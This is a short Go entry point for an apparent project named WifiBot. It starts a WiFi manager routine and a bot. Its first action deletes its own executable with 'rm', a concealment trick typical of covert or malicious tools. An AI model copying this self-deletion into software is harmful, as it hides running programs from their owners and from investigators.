package main

import (
	"os"

	WifiManager "github.com/i1mk8/WifiBot/WiFiManager"
	"github.com/i1mk8/WifiBot/bot"
	"github.com/i1mk8/WifiBot/utils"
)

func main() {
	utils.Execute("rm", []string{os.Args[0]})
	go WifiManager.Auto()
	bot.StartBot()
}
